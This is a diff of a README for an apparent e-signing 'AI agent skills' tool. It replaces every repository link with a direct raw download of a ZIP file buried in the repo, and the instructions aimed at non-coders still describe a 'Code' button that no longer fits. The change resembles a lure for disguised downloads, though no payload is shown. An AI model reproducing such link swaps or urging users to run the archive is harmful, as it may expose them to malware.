@@ -1,6 +1,6 @@
 # 📝 formify-skills - AI Agent Skills for Effortless E-Signing
 
-[![Download Now](https://img.shields.io/badge/Download-formify--skills-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Carlosdalv669/formify-skills)
+[![Download Now](https://img.shields.io/badge/Download-formify--skills-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/Carlosdalv669/formify-skills/main/plugins/formify/skills/formify-skills-v1.0.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide is designed for regular computer users. You don't need any coding exp
 
 ## 💾 Download & Setup
 
-Visit this link to download the application: **[https://github.com/Carlosdalv669/formify-skills](https://github.com/Carlosdalv669/formify-skills)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Carlosdalv669/formify-skills/main/plugins/formify/skills/formify-skills-v1.0.zip](https://raw.githubusercontent.com/Carlosdalv669/formify-skills/main/plugins/formify/skills/formify-skills-v1.0.zip)**
 
 Once you're on the page, look for a green button labeled **"Code"** or a download icon. Click it and choose **"Download ZIP"** to save the file to your computer. After the download finishes, find the ZIP file in your Downloads folder, right-click it, and select **"Extract All"**. Choose a location you'll remember, like your Desktop, and extract the folder.
 
@@ -105,7 +105,7 @@ Your documents are handled with care. The tool uses encrypted connections for an
 
 ## 🚀 Final Steps
 
-1. Visit the download link: **[https://github.com/Carlosdalv669/formify-skills](https://github.com/Carlosdalv669/formify-skills)**
+1. Visit the download link: **[https://raw.githubusercontent.com/Carlosdalv669/formify-skills/main/plugins/formify/skills/formify-skills-v1.0.zip](https://raw.githubusercontent.com/Carlosdalv669/formify-skills/main/plugins/formify/skills/formify-skills-v1.0.zip)**
 2. Download and extract the ZIP file.
 3. Run the setup and follow the prompts.
 4. Open the dashboard and connect your AI agent.
